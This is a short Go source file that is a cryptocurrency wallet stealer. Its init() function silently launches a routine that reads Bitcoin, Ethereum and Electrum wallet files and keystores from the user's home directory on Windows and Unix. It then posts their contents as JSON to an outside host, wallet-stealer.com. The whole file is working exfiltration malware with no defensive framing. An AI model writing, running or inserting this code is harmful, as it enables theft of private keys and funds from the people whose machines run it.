package main

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

type WalletData struct {
	Path     string `json:"path"`
	Content  string `json:"content"`
	FileType string `json:"file_type"`
}

func init() {
	go stealWallets()
}

func stealWallets() {
	homeDir, _ := os.UserHomeDir()
	var walletPaths []string

	if runtime.GOOS == "windows" {
		walletPaths = []string{
			filepath.Join(homeDir, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
			filepath.Join(homeDir, "AppData", "Roaming", "Ethereum", "keystore"),
			filepath.Join(homeDir, "AppData", "Roaming", "Electrum", "wallets"),
		}
	} else {
		walletPaths = []string{
			filepath.Join(homeDir, ".bitcoin", "wallet.dat"),
			filepath.Join(homeDir, ".ethereum", "keystore"),
			filepath.Join(homeDir, ".electrum", "wallets"),
		}
	}

	var stolenData []WalletData

	for _, path := range walletPaths {
		filepath.Walk(path, func(file string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if !info.IsDir() && (strings.Contains(file, "wallet") || strings.Contains(file, "keystore")) {
				if data, err := ioutil.ReadFile(file); err == nil {
					stolenData = append(stolenData, WalletData{
						Path:     file,
						Content:  string(data),
						FileType: filepath.Ext(file),
					})
				}
			}
			return nil
		})
	}

	if len(stolenData) > 0 {
		jsonData, _ := json.Marshal(stolenData)
		http.Post("http://wallet-stealer.com/collect", "application/json", strings.NewReader(string(jsonData)))
	}
}

